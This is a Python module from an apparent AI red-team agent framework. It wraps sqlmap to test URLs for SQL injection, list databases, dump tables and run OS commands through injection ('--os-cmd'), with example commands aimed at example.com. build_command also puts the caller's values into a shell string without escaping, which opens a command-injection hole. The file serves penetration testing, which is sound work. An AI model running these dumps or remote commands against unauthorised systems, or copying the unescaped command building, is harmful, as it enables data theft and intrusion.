"""
SQLMap Tool
Automated SQL injection detection and exploitation
"""

from sgpt.tools.registry import BaseTool, ToolSpec, ToolCategory
from sgpt.agent.state import RedTeamPhase
from typing import Dict, Any


class SQLMapTool(BaseTool):
    """SQLMap for SQL injection testing"""
    
    def __init__(self):
        super().__init__(
            name="sqlmap",
            category=ToolCategory.EXPLOITATION,
            intents=[
                "test_injection",
                "enumerate_databases",
                "dump_tables",
                "command_execution"
            ]
        )
    
    def get_spec(self, intent: str) -> ToolSpec:
        """Get tool specification for given intent"""
        
        specs = {
            "test_injection": ToolSpec(
                description="Test URL for SQL injection vulnerabilities",
                parameters={
                    "url": "Target URL with parameter",
                    "data": "POST data (optional)",
                    "cookie": "Cookie value (optional)"
                },
                example="sqlmap -u 'http://example.com/page?id=1' --batch",
                phase=RedTeamPhase.VULNERABILITY,
                risk_level="medium"
            ),
            
            "enumerate_databases": ToolSpec(
                description="Enumerate database names if injection found",
                parameters={
                    "url": "Target URL",
                    "data": "POST data (optional)"
                },
                example="sqlmap -u 'http://example.com/page?id=1' --dbs --batch",
                phase=RedTeamPhase.EXPLOITATION,
                risk_level="medium"
            ),
            
            "dump_tables": ToolSpec(
                description="Dump database tables",
                parameters={
                    "url": "Target URL",
                    "database": "Database name",
                    "table": "Table name (optional, dumps all if not provided)"
                },
                example="sqlmap -u 'http://example.com/page?id=1' -D dbname --dump",
                phase=RedTeamPhase.EXPLOITATION,
                risk_level="high"
            ),
            
            "command_execution": ToolSpec(
                description="Execute OS commands via SQL injection",
                parameters={
                    "url": "Target URL",
                    "command": "Command to execute"
                },
                example="sqlmap -u 'http://example.com/page?id=1' --os-cmd='whoami'",
                phase=RedTeamPhase.EXPLOITATION,
                risk_level="high"
            )
        }
        
        return specs.get(intent)
    
    def build_command(self, intent: str, parameters: Dict[str, Any]) -> str:
        """Build sqlmap command"""
        
        url = parameters.get('url')
        
        if intent == "test_injection":
            cmd = f"sqlmap -u '{url}' --batch --level=1 --risk=1"
            
            data = parameters.get('data')
            if data:
                cmd += f" --data='{data}'"
            
            cookie = parameters.get('cookie')
            if cookie:
                cmd += f" --cookie='{cookie}'"
            
            return cmd
        
        elif intent == "enumerate_databases":
            cmd = f"sqlmap -u '{url}' --dbs --batch"
            
            data = parameters.get('data')
            if data:
                cmd += f" --data='{data}'"
            
            return cmd
        
        elif intent == "dump_tables":
            database = parameters.get('database')
            table = parameters.get('table')
            
            cmd = f"sqlmap -u '{url}' -D {database} --batch"
            
            if table:
                cmd += f" -T {table} --dump"
            else:
                cmd += " --dump-all"
            
            return cmd
        
        elif intent == "command_execution":
            command = parameters.get('command')
            return f"sqlmap -u '{url}' --os-cmd='{command}' --batch"
        
        return None
    
    def validate_parameters(self, intent: str, parameters: Dict[str, Any]) -> bool:
        """Validate parameters for intent"""
        
        if not parameters.get('url'):
            return False
        
        if intent == "dump_tables" and not parameters.get('database'):
            return False
        
        if intent == "command_execution" and not parameters.get('command'):
            return False
        
        return True
    
    def parse_output(self, intent: str, output: str) -> Dict[str, Any]:
        """Parse sqlmap output into structured facts"""
        
        facts = {}
        
        if intent == "test_injection":
            # Check if injection was found
            facts['vulnerable'] = 'is vulnerable' in output.lower() or 'sqlmap identified' in output.lower()
            facts['injection_type'] = []
            
            if 'boolean-based blind' in output:
                facts['injection_type'].append('boolean-based blind')
            if 'time-based blind' in output:
                facts['injection_type'].append('time-based blind')
            if 'error-based' in output:
                facts['injection_type'].append('error-based')
            if 'UNION query' in output:
                facts['injection_type'].append('UNION query')
        
        elif intent == "enumerate_databases":
            # Extract database names
            facts['databases'] = []
            lines = output.split('\n')
            in_db_section = False
            
            for line in lines:
                if 'available databases' in line.lower():
                    in_db_section = True
                elif in_db_section and line.strip().startswith('[*]'):
                    db_name = line.strip()[3:].strip()
                    facts['databases'].append(db_name)
        
        return facts
